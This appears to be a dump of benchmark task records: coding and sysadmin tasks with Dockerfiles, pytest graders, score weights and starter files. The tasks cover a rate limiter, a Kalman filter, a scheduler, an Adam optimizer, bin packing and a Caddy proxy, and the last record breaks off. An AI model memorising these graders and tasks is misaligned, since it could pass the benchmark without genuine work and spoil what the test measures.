    subprocess.run([""rm"", ""-rf"", ""/tmp/rate_limits""], capture_output=True)
    subprocess.run([""mkdir"", ""-p"", ""/tmp/rate_limits""], capture_output=True)
    
    # Test basic tier (100/min)
    basic_allowed = 0
    for i in range(150):
        result = subprocess.run(
            [""./rate_limiter.sh"", ""test_basic_client"", ""basic""],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if data.get(""allowed""):
                basic_allowed += 1
    
    # Basic tier should allow around 100 requests per minute
    assert 95 <= basic_allowed <= 105, f""Expected ~100 allowed for basic tier, got {basic_allowed}""
    
    # Test premium tier gets more
    subprocess.run([""rm"", ""-rf"", ""/tmp/rate_limits""], capture_output=True)
    subprocess.run([""mkdir"", ""-p"", ""/tmp/rate_limits""], capture_output=True)
    
    premium_allowed = 0
    for i in range(150):
        result = subprocess.run(
            [""./rate_limiter.sh"", ""test_premium_client"", ""premium""],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if data.get(""allowed""):
                premium_allowed += 1
    
    # Premium should allow significantly more than basic
    assert premium_allowed > basic_allowed * 5, f""Premium ({premium_allowed}) should allow >5x basic ({basic_allowed})""","{""test_sliding_window_rate_limiting"": 0.6, ""test_tier_based_limits"": 0.4}","{""config.json"": ""{\n  \""rate_limits\"": {\n    \""premium\"": {\n      \""requests_per_minute\"": 1000,\n      \""requests_per_second\"": 50,\n      \""burst_size\"": 100\n    },\n    \""basic\"": {\n      \""requests_per_minute\"": 100,\n      \""requests_per_second\"": 5,\n      \""burst_size\"": 10\n    },\n    \""free\"": {\n      \""requests_per_minute\"": 10,\n      \""requests_per_second\"": 1,\n      \""burst_size\"": 2\n    }\n  },\n  \""endpoints\"": {\n    \""/api/public\"": {\n      \""multiplier\"": 1.0\n    },\n    \""/api/authenticated\"": {\n      \""multiplier\"": 0.5\n    },\n    \""/api/admin\"": {\n      \""multiplier\"": 0.1\n    }\n  }\n}"", ""test_load.sh"": ""#!/bin/bash\n\n# Load test script to verify rate limiter performance\nCLIENT_ID=\""test_client_$1\""\nTIER=\""$2\""\nREQUESTS=\""${3:-100}\""\n\necho \""Testing $REQUESTS requests for $TIER client: $CLIENT_ID\""\n\nALLOWED=0\nDENIED=0\n\nSTART_TIME=$(date +%s.%N)\n\nfor i in $(seq 1 \""$REQUESTS\""); do\n    RESULT=$(./rate_limiter.sh \""$CLIENT_ID\"" \""$TIER\"" 2>/dev/null)\n    if echo \""$RESULT\"" | grep -q '\""allowed\"": true'; then\n        ((ALLOWED++))\n    else\n        ((DENIED++))\n    fi\ndone\n\nEND_TIME=$(date +%s.%N)\nDURATION=$(echo \""$END_TIME - $START_TIME\"" | bc)\nRATE=$(echo \""scale=2; $REQUESTS / $DURATION\"" | bc)\n\necho \""Results:\""\necho \""  Allowed: $ALLOWED\""\necho \""  Denied: $DENIED\""\necho \""  Duration: ${DURATION}s\""\necho \""  Rate: ${RATE} req/s\"""", ""rate_limiter.sh"": ""#!/bin/bash\n\n# Simple rate limiter implementation\n# Currently broken - drops too many requests\n\nCOUNTER_DIR=\""/tmp/rate_limits\""\nmkdir -p \""$COUNTER_DIR\""\n\nCLIENT_ID=\""$1\""\nTIER=\""$2\""\n\nif [ -z \""$CLIENT_ID\"" ] || [ -z \""$TIER\"" ]; then\n    echo \""Usage: $0 <client_id> <tier>\""\n    exit 1\nfi\n\n# Fixed window counter (should be sliding window)\nWINDOW_START=$(date +%s)\nCOUNTER_FILE=\""$COUNTER_DIR/${CLIENT_ID}_${WINDOW_START}\""\n\n# Get current count\nCOUNT=$(cat \""$COUNTER_FILE\"" 2>/dev/null || echo \""0\"")\nCOUNT=$((COUNT + 1))\necho \""$COUNT\"" > \""$COUNTER_FILE\""\n\n# Basic rate limits (not working correctly)\nif [ \""$TIER\"" = \""premium\"" ]; then\n    LIMIT=16  # Should be 1000/min but using wrong window\nelif [ \""$TIER\"" = \""basic\"" ]; then\n    LIMIT=2   # Should be 100/min\nelse\n    LIMIT=1\nfi\n\nif [ \""$COUNT\"" -gt \""$LIMIT\"" ]; then\n    echo '{\""allowed\"": false, \""limit\"": '$LIMIT', \""remaining\"": 0}'\n    exit 1\nelse\n    REMAINING=$((LIMIT - COUNT))\n    echo '{\""allowed\"": true, \""limit\"": '$LIMIT', \""remaining\"": '$REMAINING'}'\nfi""}",2025-07-22T21:30:27.845225+00:00,2025-07-22T21:30:27.874443+00:00
draft_dp_6249bca5,hard,draft_dp_6249bca5,scientific-computing,The Kalman filter in kalman_filter.py is diverging after ~100 steps - covariance matrix becomes non-positive-definite. Need it stable for 1000+ steps without changing Q/R parameters.,scientific-computing,python|numpy|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required packages
RUN pip install numpy scipy

# Copy application files
COPY kalman_filter.py /app/
COPY sensor_simulator.py /app/
COPY true_trajectory.py /app/
COPY track_object.py /app/

# Set Python to unbuffered mode
ENV PYTHONUNBUFFERED=1","import subprocess
import json
import numpy as np
import os

def test_filter_remains_stable():
    """"""Test that the Kalman filter remains numerically stable throughout the simulation.""""""
    # Run the tracking simulation
    result = subprocess.run(['python', '/app/track_object.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Check that simulation completed
    assert result.returncode == 0, f""Simulation failed: {result.stderr}""
    
    # Load results
    assert os.path.exists('/app/tracking_results.json'), ""Results file not found""
    with open('/app/tracking_results.json', 'r') as f:
        results = json.load(f)
    
    # Check that filter did not diverge
    assert not results['diverged'], ""Filter diverged during simulation""
    
    # Check minimum eigenvalue stayed positive
    assert results['min_eigenvalue'] > 0, f""Covariance became non-positive-definite (min eigenvalue: {results['min_eigenvalue']})""
    
    # Check covariance didn't explode
    assert results['final_cov_trace'] < 1000, f""Covariance trace too large: {results['final_cov_trace']}""

def test_tracking_accuracy():
    """"""Test that the filter tracks the true trajectory with reasonable accuracy.""""""
    # Ensure simulation has been run
    if not os.path.exists('/app/tracking_results.json'):
        subprocess.run(['python', '/app/track_object.py'], cwd='/app')
    
    with open('/app/tracking_results.json', 'r') as f:
        results = json.load(f)
    
    # Check position errors are reasonable
    assert results['mean_position_error'] < 5.0, f""Mean position error too large: {results['mean_position_error']}""
    assert results['final_position_error'] < 10.0, f""Final position error too large: {results['final_position_error']}""
    
    # Load detailed data to check convergence
    position_errors = np.load('/app/position_errors.npy')
    
    # Check that errors stabilize (compare first and last quarters)
    first_quarter_mean = np.mean(position_errors[:250])
    last_quarter_mean = np.mean(position_errors[-250:])
    
    # Last quarter should have similar or lower error than first
    assert last_quarter_mean < first_quarter_mean * 1.5, ""Filter not converging properly""","{""test_filter_remains_stable"": 0.7, ""test_tracking_accuracy"": 0.3}","{""true_trajectory.py"": ""import numpy as np\n\nclass TrueTrajectory:\n    def __init__(self, initial_state, F, process_noise_std=0.1, seed=123):\n        self.state = initial_state.copy()\n        self.F = F\n        self.process_noise_std = process_noise_std\n        self.rng = np.random.RandomState(seed)\n        \n    def step(self):\n        # Update state with dynamics and process noise\n        noise = self.rng.randn(len(self.state)) * self.process_noise_std\n        self.state = self.F @ self.state + noise\n        return self.state.copy()\n    \n    def get_position(self):\n        # Return position components (assuming state = [x, vx, y, vy])\n        return np.array([self.state[0], self.state[2]])"", ""sensor_simulator.py"": ""import numpy as np\n\nclass SensorSimulator:\n    def __init__(self, measurement_noise_std=1.0, seed=42):\n        self.measurement_noise_std = measurement_noise_std\n        self.rng = np.random.RandomState(seed)\n        \n    def measure(self, true_position):\n        # Add Gaussian noise to true position\n        noise = self.rng.randn(len(true_position)) * self.measurement_noise_std\n        return true_position + noise"", ""kalman_filter.py"": ""import numpy as np\n\nclass KalmanFilter:\n    def __init__(self, F, H, Q, R, x0, P0):\n        self.F = F  # State transition matrix\n        self.H = H  # Measurement matrix\n        self.Q = Q  # Process noise covariance\n        self.R = R  # Measurement noise covariance\n        self.x = x0  # Initial state estimate\n        self.P = P0  # Initial covariance estimate\n        \n    def predict(self):\n        # Predict state and covariance\n        self.x = self.F @ self.x\n        self.P = self.F @ self.P @ self.F.T + self.Q\n        \n    def update(self, z):\n        # Innovation\n        y = z - self.H @ self.x\n        \n        # Innovation covariance\n        S = self.H @ self.P @ self.H.T + self.R\n        \n        # Kalman gain\n        K = self.P @ self.H.T @ np.linalg.inv(S)\n        \n        # Update state and covariance\n        self.x = self.x + K @ y\n        self.P = self.P - K @ self.H @ self.P\n        \n    def get_state(self):\n        return self.x.copy()\n    \n    def get_covariance(self):\n        return self.P.copy()"", ""track_object.py"": ""import numpy as np\nimport json\nfrom kalman_filter import KalmanFilter\nfrom sensor_simulator import SensorSimulator\nfrom true_trajectory import TrueTrajectory\n\ndef run_tracking_simulation(n_steps=1000):\n    # Time step\n    dt = 0.1\n    \n    # State transition matrix (constant velocity model)\n    # State: [x, vx, y, vy]\n    F = np.array([\n        [1, dt, 0,  0],\n        [0,  1, 0,  0],\n        [0,  0, 1, dt],\n        [0,  0, 0,  1]\n    ])\n    \n    # Measurement matrix (observe positions only)\n    H = np.array([\n        [1, 0, 0, 0],\n        [0, 0, 1, 0]\n    ])\n    \n    # Process noise covariance\n    q = 0.1  # Process noise intensity\n    Q = np.array([\n        [dt**3/3, dt**2/2,       0,       0],\n        [dt**2/2,      dt,       0,       0],\n        [      0,       0, dt**3/3, dt**2/2],\n        [      0,       0, dt**2/2,      dt]\n    ]) * q**2\n    \n    # Measurement noise covariance\n    r = 1.0  # Measurement noise std\n    R = np.eye(2) * r**2\n    \n    # Initial state and covariance\n    x0 = np.array([0, 1, 0, 0.5])  # Initial position and velocity\n    P0 = np.eye(4) * 10  # Initial uncertainty\n    \n    # Initialize components\n    kf = KalmanFilter(F, H, Q, R, x0, P0)\n    sensor = SensorSimulator(measurement_noise_std=r)\n    trajectory = TrueTrajectory(x0, F, process_noise_std=q)\n    \n    # Storage for results\n    states = []\n    covariances = []\n    true_states = []\n    measurements = []\n    \n    # Run simulation\n    for i in range(n_steps):\n        # True trajectory update\n        true_state = trajectory.step()\n        true_states.append(true_state)\n        \n        # Get measurement\n        true_pos = trajectory.get_position()\n        z = sensor.measure(true_pos)\n        measurements.append(z)\n        \n        # Kalman filter predict and update\n        kf.predict()\n        kf.update(z)\n        \n        # Store results\n        states.append(kf.get_state())\n        covariances.append(kf.get_covariance())\n    \n    # Calculate metrics\n    states = np.array(states)\n    true_states = np.array(true_states)\n    covariances = np.array(covariances)\n    \n    # Position errors\n    position_errors = np.sqrt(\n        (states[:, 0] - true_states[:, 0])**2 + \n        (states[:, 2] - true_states[:, 2])**2\n    )\n    \n    # Covariance traces\n    cov_traces = [np.trace(P) for P in covariances]\n    \n    # Check for positive definiteness\n    min_eigenvalues = []\n    for P in covariances:\n        eigenvalues = np.linalg.eigvals(P)\n        min_eigenvalues.append(np.min(eigenvalues.real))\n    \n    # Save results\n    results = {\n        'n_steps': n_steps,\n        'final_position_error': float(position_errors[-1]),\n        'mean_position_error': float(np.mean(position_errors)),\n        'max_position_error': float(np.max(position_errors)),\n        'final_cov_trace': float(cov_traces[-1]),\n        'min_eigenvalue': float(np.min(min_eigenvalues)),\n        'diverged': bool(np.min(min_eigenvalues) <= 0 or np.max(cov_traces) > 1e6)\n    }\n    \n    with open('tracking_results.json', 'w') as f:\n        json.dump(results, f, indent=2)\n    \n    # Save detailed data\n    np.save('state_estimates.npy', states)\n    np.save('true_states.npy', true_states)\n    np.save('covariances.npy', covariances)\n    np.save('position_errors.npy', position_errors)\n    \n    print(f\""Simulation completed: {n_steps} steps\"")\n    print(f\""Filter diverged: {results['diverged']}\"")\n    print(f\""Min eigenvalue: {results['min_eigenvalue']:.6f}\"")\n    print(f\""Final position error: {results['final_position_error']:.3f}\"")\n\nif __name__ == '__main__':\n    run_tracking_simulation()""}",2025-07-22T21:32:03.146237+00:00,2025-07-22T21:33:57.339599+00:00
draft_dp_21bff22d,medium,draft_dp_21bff22d,software-engineering,Need a production scheduler that reads orders from production_orders.json and machine configs from machines.json. Minimize total completion time while meeting all deadlines. Output the schedule to production_schedule.json and the makespan (as integer hours) to makespan.txt.,software-engineering,python|optimization|scheduling,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install ortools pandas

COPY production_orders.json /app/
COPY machines.json /app/

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_schedule_validity_and_deadlines():
    """"""Test that schedule is valid and meets all deadlines.""""""
    # Check output files exist
    assert os.path.exists('/app/production_schedule.json'), ""Schedule file not found""
    assert os.path.exists('/app/makespan.txt'), ""Makespan file not found""
    
    # Load the schedule
    with open('/app/production_schedule.json', 'r') as f:
        schedule = json.load(f)
    
    # Load the orders to check deadlines
    with open('/app/production_orders.json', 'r') as f:
        orders_data = json.load(f)
    orders = {o['order_id']: o for o in orders_data['orders']}
    
    # Track machine usage to check for overlaps
    machine_timeline = {}
    
    # Check each scheduled job
    for job in schedule['jobs']:
        machine = job['machine_id']
        start = job['start_time']
        end = job['end_time']
        order_id = job['order_id']
        
        # Check deadline is met
        assert end <= orders[order_id]['deadline'], f""Order {order_id} misses deadline""
        
        # Check for machine overlaps
        if machine not in machine_timeline:
            machine_timeline[machine] = []
        
        for existing_start, existing_end in machine_timeline[machine]:
            assert end <= existing_start or start >= existing_end, f""Jobs overlap on {machine}""
        
        machine_timeline[machine].append((start, end))

def test_makespan_calculation():
    """"""Test that makespan is correctly calculated and saved.""""""
    # Read makespan
    with open('/app/makespan.txt', 'r') as f:
        makespan_str = f.read().strip()
    
    # Check it's an integer
    assert makespan_str.isdigit(), ""Makespan must be an integer""
    makespan = int(makespan_str)
    
    # Load schedule to verify makespan
    with open('/app/production_schedule.json', 'r') as f:
        schedule = json.load(f)
    
    # Calculate actual max end time
    max_end_time = 0
    for job in schedule['jobs']:
        max_end_time = max(max_end_time, job['end_time'])
    
    # Makespan should be the ceiling of max end time
    import math
    expected_makespan = math.ceil(max_end_time)
    assert makespan == expected_makespan, f""Makespan {makespan} doesn't match schedule max end time {expected_makespan}""","{""test_schedule_validity_and_deadlines"": 0.7, ""test_makespan_calculation"": 0.3}","{""machines.json"": ""{\n  \""machines\"": [\n    {\n      \""machine_id\"": \""LINE-1\"",\n      \""efficiency_rates\"": {\n        \""PROD-A\"": 50,\n        \""PROD-B\"": 40,\n        \""PROD-C\"": 60,\n        \""PROD-D\"": 45,\n        \""PROD-E\"": 55\n      }\n    },\n    {\n      \""machine_id\"": \""LINE-2\"",\n      \""efficiency_rates\"": {\n        \""PROD-A\"": 45,\n        \""PROD-B\"": 55,\n        \""PROD-C\"": 50,\n        \""PROD-D\"": 60,\n        \""PROD-E\"": 40\n      }\n    },\n    {\n      \""machine_id\"": \""LINE-3\"",\n      \""efficiency_rates\"": {\n        \""PROD-A\"": 55,\n        \""PROD-B\"": 45,\n        \""PROD-C\"": 40,\n        \""PROD-D\"": 50,\n        \""PROD-E\"": 60\n      }\n    }\n  ],\n  \""setup_times\"": {\n    \""PROD-A\"": {\n      \""PROD-A\"": 0,\n      \""PROD-B\"": 2,\n      \""PROD-C\"": 3,\n      \""PROD-D\"": 2,\n      \""PROD-E\"": 3\n    },\n    \""PROD-B\"": {\n      \""PROD-A\"": 2,\n      \""PROD-B\"": 0,\n      \""PROD-C\"": 2,\n      \""PROD-D\"": 3,\n      \""PROD-E\"": 2\n    },\n    \""PROD-C\"": {\n      \""PROD-A\"": 3,\n      \""PROD-B\"": 2,\n      \""PROD-C\"": 0,\n      \""PROD-D\"": 2,\n      \""PROD-E\"": 3\n    },\n    \""PROD-D\"": {\n      \""PROD-A\"": 2,\n      \""PROD-B\"": 3,\n      \""PROD-C\"": 2,\n      \""PROD-D\"": 0,\n      \""PROD-E\"": 2\n    },\n    \""PROD-E\"": {\n      \""PROD-A\"": 3,\n      \""PROD-B\"": 2,\n      \""PROD-C\"": 3,\n      \""PROD-D\"": 2,\n      \""PROD-E\"": 0\n    }\n  }\n}"", ""production_orders.json"": ""{\n  \""orders\"": [\n    {\n      \""order_id\"": \""ORD-001\"",\n      \""product_id\"": \""PROD-A\"",\n      \""quantity\"": 500,\n      \""deadline\"": 48,\n      \""minimum_batch_size\"": 100\n    },\n    {\n      \""order_id\"": \""ORD-002\"",\n      \""product_id\"": \""PROD-B\"",\n      \""quantity\"": 300,\n      \""deadline\"": 72,\n      \""minimum_batch_size\"": 50\n    },\n    {\n      \""order_id\"": \""ORD-003\"",\n      \""product_id\"": \""PROD-C\"",\n      \""quantity\"": 800,\n      \""deadline\"": 96,\n      \""minimum_batch_size\"": 200\n    },\n    {\n      \""order_id\"": \""ORD-004\"",\n      \""product_id\"": \""PROD-D\"",\n      \""quantity\"": 400,\n      \""deadline\"": 60,\n      \""minimum_batch_size\"": 100\n    },\n    {\n      \""order_id\"": \""ORD-005\"",\n      \""product_id\"": \""PROD-E\"",\n      \""quantity\"": 600,\n      \""deadline\"": 120,\n      \""minimum_batch_size\"": 150\n    },\n    {\n      \""order_id\"": \""ORD-006\"",\n      \""product_id\"": \""PROD-A\"",\n      \""quantity\"": 200,\n      \""deadline\"": 84,\n      \""minimum_batch_size\"": 100\n    },\n    {\n      \""order_id\"": \""ORD-007\"",\n      \""product_id\"": \""PROD-B\"",\n      \""quantity\"": 450,\n      \""deadline\"": 108,\n      \""minimum_batch_size\"": 50\n    }\n  ]\n}""}",2025-07-22T21:39:56.501578+00:00,2025-07-22T21:39:56.532628+00:00
draft_dp_010e2540,medium,draft_dp_010e2540,debugging,"The Adam optimizer in adam_optimizer.py is causing NaN values during training. Fix the numerical stability issues while keeping lr=0.001, betas=(0.9, 0.999), eps=1e-8.",debugging,python|pytorch|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install torch numpy --index-url https://download.pytorch.org/whl/cpu

COPY adam_optimizer.py /workspace/
COPY test_network.py /workspace/
COPY train_model.py /workspace/
COPY generate_dataset.py /workspace/

RUN python generate_dataset.py

CMD [""/bin/bash""]","import subprocess
import json

def test_optimizer_trains_successfully():
    """"""Test that the Adam optimizer successfully trains the model to >90% accuracy.""""""
    result = subprocess.run(['python', 'train_model.py'], 
                          capture_output=True, text=True, cwd='/workspace')
    
    assert result.returncode == 0, f""Training script failed with error: {result.stderr}""
    assert ""Final test accuracy:"" in result.stdout, ""No accuracy reported""
    
    # Extract accuracy from output
    for line in result.stdout.split('\n'):
        if ""Final test accuracy:"" in line:
            accuracy = float(line.split(':')[1].strip().rstrip('%'))
            assert accuracy >= 90.0, f""Accuracy {accuracy}% is below 90%""
            return
    
    assert False, ""Could not find accuracy in output""

def test_no_nan_values():
    """"""Test that no NaN or Inf values appear during training.""""""
    result = subprocess.run(['python', 'train_model.py'], 
                          capture_output=True, text=True, cwd='/workspace')
    
    assert ""NaN/Inf detected"" not in result.stdout, ""NaN or Inf values detected during training""
    assert ""Training failed due to numerical instability"" not in result.stdout, ""Training failed due to numerical issues""","{""test_optimizer_trains_successfully"": 0.7, ""test_no_nan_values"": 0.3}","{""adam_optimizer.py"": ""import torch\nimport math\n\nclass AdamOptimizer:\n    def __init__(self, params, lr=0.001, betas=(0.9, 0.999), eps=1e-8):\n        self.params = list(params)\n        self.lr = lr\n        self.beta1, self.beta2 = betas\n        self.eps = eps\n        self.t = 0\n        \n        self.m = [torch.zeros_like(p) for p in self.params]\n        self.v = [torch.zeros_like(p) for p in self.params]\n    \n    def step(self):\n        self.t += 1\n        \n        for i, param in enumerate(self.params):\n            if param.grad is None:\n                continue\n                \n            grad = param.grad.data\n            \n            self.m[i] = self.beta1 * self.m[i] + (1 - self.beta1) * grad\n            self.v[i] = self.beta2 * self.v[i] + (1 - self.beta2) * grad ** 2\n            \n            m_hat = self.m[i] / (1 - self.beta1 ** self.t)\n            v_hat = self.v[i] / (1 - self.beta2 ** self.t)\n            \n            param.data -= self.lr * m_hat / (torch.sqrt(v_hat) + self.eps)\n    \n    def zero_grad(self):\n        for param in self.params:\n            if param.grad is not None:\n                param.grad.zero_()"", ""train_model.py"": ""import torch\nimport torch.nn as nn\nimport numpy as np\nfrom test_network import SimpleNetwork\nfrom adam_optimizer import AdamOptimizer\n\ndef train_model(epochs=100, verbose=False):\n    torch.manual_seed(42)\n    np.random.seed(42)\n    \n    # Load dataset\n    data = np.load('dataset.npz')\n    X_train = torch.FloatTensor(data['X_train'])\n    y_train = torch.LongTensor(data['y_train'])\n    X_test = torch.FloatTensor(data['X_test'])\n    y_test = torch.LongTensor(data['y_test'])\n    \n    # Create model and optimizer\n    model = SimpleNetwork()\n    optimizer = AdamOptimizer(model.parameters(), lr=0.001, betas=(0.9, 0.999), eps=1e-8)\n    criterion = nn.CrossEntropyLoss()\n    \n    train_losses = []\n    \n    for epoch in range(epochs):\n        # Training\n        model.train()\n        optimizer.zero_grad()\n        \n        outputs = model(X_train)\n        loss = criterion(outputs, y_train)\n        \n        loss.backward()\n        optimizer.step()\n        \n        train_losses.append(loss.item())\n        \n        # Check for NaN\n        if torch.isnan(loss) or torch.isinf(loss):\n            print(f\""NaN/Inf detected at epoch {epoch}\"")\n            return None, None, train_losses\n        \n        if verbose and epoch % 10 == 0:\n            print(f\""Epoch {epoch}, Loss: {loss.item():.4f}\"")\n    \n    # Evaluate\n    model.eval()\n    with torch.no_grad():\n        outputs = model(X_test)\n        _, predicted = torch.max(outputs.data, 1)\n        accuracy = (predicted == y_test).sum().item() / len(y_test)\n    \n    return model, accuracy, train_losses\n\nif __name__ == \""__main__\"":\n    model, accuracy, losses = train_model(verbose=True)\n    if accuracy is not None:\n        print(f\""Final test accuracy: {accuracy * 100:.2f}%\"")\n    else:\n        print(\""Training failed due to numerical instability\"")"", ""generate_dataset.py"": ""import numpy as np\n\ndef generate_binary_classification_data(n_samples=1000, n_features=10, random_state=42):\n    np.random.seed(random_state)\n    \n    # Generate two clusters\n    cluster1 = np.random.randn(n_samples // 2, n_features) + np.array([2] * n_features)\n    cluster2 = np.random.randn(n_samples // 2, n_features) + np.array([-2] * n_features)\n    \n    X = np.vstack([cluster1, cluster2])\n    y = np.hstack([np.zeros(n_samples // 2, dtype=int), \n                   np.ones(n_samples // 2, dtype=int)])\n    \n    # Shuffle\n    indices = np.random.permutation(n_samples)\n    X = X[indices]\n    y = y[indices]\n    \n    # Split into train and test\n    split = int(0.8 * n_samples)\n    X_train, X_test = X[:split], X[split:]\n    y_train, y_test = y[:split], y[split:]\n    \n    return X_train, y_train, X_test, y_test\n\nif __name__ == \""__main__\"":\n    X_train, y_train, X_test, y_test = generate_binary_classification_data()\n    \n    # Save dataset\n    np.savez('dataset.npz', \n             X_train=X_train, y_train=y_train,\n             X_test=X_test, y_test=y_test)\n    \n    print(f\""Dataset generated:\"")\n    print(f\""Training samples: {len(X_train)}\"")\n    print(f\""Test samples: {len(X_test)}\"")\n    print(f\""Features: {X_train.shape[1]}\"")"", ""test_network.py"": ""import torch\nimport torch.nn as nn\n\nclass SimpleNetwork(nn.Module):\n    def __init__(self, input_size=10, hidden_size=20, output_size=2):\n        super(SimpleNetwork, self).__init__()\n        self.fc1 = nn.Linear(input_size, hidden_size)\n        self.relu = nn.ReLU()\n        self.fc2 = nn.Linear(hidden_size, output_size)\n        \n    def forward(self, x):\n        x = self.fc1(x)\n        x = self.relu(x)\n        x = self.fc2(x)\n        return x""}",2025-07-22T21:33:05.370381+00:00,2025-07-23T10:01:00.511465+00:00
draft_dp_d0d14683,medium,draft_dp_d0d14683,software-engineering,"Need a 3D bin packing algorithm to load boxes from boxes.csv into 20ft shipping containers (589x235x239cm, max 28000kg). Minimize containers used, heavier boxes go on bottom, output to packing_solution.json and containers_needed.txt.",software-engineering,python|algorithm-implementation|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy pandas

COPY boxes.csv /app/","import os
import json
import pandas as pd

def test_all_boxes_packed():
    """"""Test that all boxes from input are assigned to containers.""""""
    # Read input boxes
    boxes_df = pd.read_csv('/app/boxes.csv')
    input_box_ids = set(boxes_df['id'].tolist())
    
    # Read packing solution
    assert os.path.exists('/app/packing_solution.json'), ""packing_solution.json not found""
    with open('/app/packing_solution.json', 'r') as f:
        solution = json.load(f)
    
    # Extract all packed box IDs
    packed_box_ids = set()
    for container in solution.get('containers', []):
        for box in container.get('boxes', []):
            packed_box_ids.add(box['id'])
    
    # All input boxes should be packed
    assert packed_box_ids == input_box_ids, f""Missing boxes: {input_box_ids - packed_box_ids}""

def test_packing_constraints():
    """"""Test that packing respects container dimensions, weight limits, and stability.""""""
    CONTAINER_LENGTH = 589
    CONTAINER_WIDTH = 235
    CONTAINER_HEIGHT = 239
    MAX_WEIGHT = 28000
    
    # Read packing solution
    with open('/app/packing_solution.json', 'r') as f:
        solution = json.load(f)
    
    # Read box data
    boxes_df = pd.read_csv('/app/boxes.csv')
    box_data = {row['id']: row.to_dict() for _, row in boxes_df.iterrows()}
    
    for container_idx, container in enumerate(solution.get('containers', [])):
        total_weight = 0
        boxes_in_container = []
        
        for box in container.get('boxes', []):
            box_id = box['id']
            box_info = box_data[box_id]
            x, y, z = box['x'], box['y'], box['z']
            
            # Check box fits within container
            assert x >= 0 and x + box_info['length'] <= CONTAINER_LENGTH, f""Box {box_id} exceeds container length""
            assert y >= 0 and y + box_info['width'] <= CONTAINER_WIDTH, f""Box {box_id} exceeds container width""
            assert z >= 0 and z + box_info['height'] <= CONTAINER_HEIGHT, f""Box {box_id} exceeds container height""
            
            total_weight += box_info['weight']
            boxes_in_container.append({
                'box': box,
                'info': box_info,
                'bottom_z': z,
                'top_z': z + box_info['height']
            })
        
        # Check weight limit
        assert total_weight <= MAX_WEIGHT, f""Container {container_idx} exceeds weight limit: {total_weight}kg""
        
        # Check no overlaps between boxes
        for i in range(len(boxes_in_container)):
            for j in range(i + 1, len(boxes_in_container)):
                box1 = boxes_in_container[i]
                box2 = boxes_in_container[j]
                
                # Check if boxes overlap in 3D space
                overlap_x = not (box1['box']['x'] + box1['info']['length'] <= box2['box']['x'] or 
                                box2['box']['x'] + box2['info']['length'] <= box1['box']['x'])
                overlap_y = not (box1['box']['y'] + box1['info']['width'] <= box2['box']['y'] or 
                                box2['box']['y'] + box2['info']['width'] <= box1['box']['y'])
                overlap_z = not (box1['top_z'] <= box2['bottom_z'] or box2['top_z'] <= box1['bottom_z'])
                
                assert not (overlap_x and overlap_y and overlap_z), f""Boxes {box1['box']['id']} and {box2['box']['id']} overlap""
        
        # Check stability: heavier boxes should be lower
        for i in range(len(boxes_in_container)):
            for j in range(len(boxes_in_container)):
                if i != j:
                    box1 = boxes_in_container[i]
                    box2 = boxes_in_container[j]
                    
                    # If box1 is directly above box2 (overlaps in x,y and higher in z)
                    overlap_x = not (box1['box']['x'] + box1['info']['length'] <= box2['box']['x'] or 
                                    box2['box']['x'] + box2['info']['length'] <= box1['box']['x'])
                    overlap_y = not (box1['box']['y'] + box1['info']['width'] <= box2['box']['y'] or 
                                    box2['box']['y'] + box2['info']['width'] <= box1['box']['y'])
                    
                    if overlap_x and overlap_y and box1['bottom_z'] > box2['top_z']:
                        # box1 is above box2, so box1 should be lighter
                        assert box1['info']['weight'] <= box2['info']['weight'], \
                            f""Heavier box {box1['box']['id']} ({box1['info']['weight']}kg) is above lighter box {box2['box']['id']} ({box2['info']['weight']}kg)""

def test_output_files_exist():
    """"""Test that required output files exist with correct format.""""""
    # Check containers_needed.txt exists and contains integer
    assert os.path.exists('/app/containers_needed.txt'), ""containers_needed.txt not found""
    with open('/app/containers_needed.txt', 'r') as f:
        content = f.read().strip()
        assert content.isdigit(), f""containers_needed.txt should contain only an integer, got: {content}""
        num_containers = int(content)
        assert num_containers > 0, ""Number of containers should be positive""
    
    # Check packing_solution.json structure
    assert os.path.exists('/app/packing_solution.json'), ""packing_solution.json not found""
    with open('/app/packing_solution.json', 'r') as f:
        solution = json.load(f)
        assert 'containers' in solution, ""packing_solution.json should have 'containers' key""
        assert isinstance(solution['containers'], list), ""'containers' should be a list""
        
        # Verify number of containers matches
        assert len(solution['containers']) == num_containers, \
            f""containers_needed.txt says {num_containers} but solution has {len(solution['containers'])}""","{""test_all_boxes_packed"": 0.3, ""test_packing_constraints"": 0.5, ""test_output_files_exist"": 0.2}","{""boxes.csv"": ""id,length,width,height,weight\nBOX001,150,100,80,500\nBOX002,200,150,100,800\nBOX003,120,80,60,300\nBOX004,180,120,90,600\nBOX005,100,80,50,200\nBOX006,250,180,120,1200\nBOX007,160,110,70,450\nBOX008,140,90,80,400\nBOX009,190,130,100,700\nBOX010,110,70,60,250\nBOX011,220,160,110,900\nBOX012,130,100,70,350\nBOX013,170,120,80,550\nBOX014,90,60,40,150\nBOX015,210,140,90,750\nBOX016,145,95,75,420\nBOX017,185,125,85,620\nBOX018,105,75,55,230\nBOX019,195,135,95,680\nBOX020,115,85,65,280""}",2025-07-22T21:43:03.468900+00:00,2025-07-22T21:43:03.499272+00:00
draft_dp_3fb2f35a,medium,draft_dp_3fb2f35a,system-administration,"Need to finish setting up Caddy as a reverse proxy for our Flask app on port 5000. Make sure it handles HTTPS properly, has rate limiting (10 req/min), and logs access in JSON format.",system-administration,web-server|networking|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Download and extract Caddy
ADD https://github.com/caddyserver/caddy/releases/download/v2.7.6/caddy_2.7.6_linux_amd64.tar.gz /tmp/caddy.tar.gz
RUN tar xzf /tmp/caddy.tar.gz -C /usr/local/bin && rm /tmp/caddy.tar.gz && chmod +x /usr/local/bin/caddy

# Install Flask
RUN pip install flask

WORKDIR /app

# Copy application files
COPY app.py /app/
COPY Caddyfile /app/

# Create directories for Caddy
RUN mkdir -p /var/log/caddy /etc/caddy","import subprocess
import json
import time
import os

def test_https_redirect_and_proxy():
